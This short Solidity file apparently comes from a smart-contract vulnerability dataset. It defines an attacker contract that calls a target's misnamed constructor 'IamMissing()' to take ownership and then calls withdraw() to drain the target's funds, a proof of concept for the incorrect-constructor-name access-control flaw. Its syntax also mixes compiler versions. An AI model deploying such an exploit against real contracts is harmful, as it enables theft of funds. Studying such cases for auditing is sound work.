 pragma solidity ^0.4.15;

 import "../dataset/access_control/incorrect_constructor_name1.sol";

 contract MissingAttacker{
    
    Missing target;

    constructor(address _target) public {
        target = Missing(_target);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("IamMissing()")));
        
        (bool success, ) = target.call(data);
        require(success, "Attack failed");
    }

    function test() public {
        target.withdraw();
    }

    function () public payable {
    }

 }
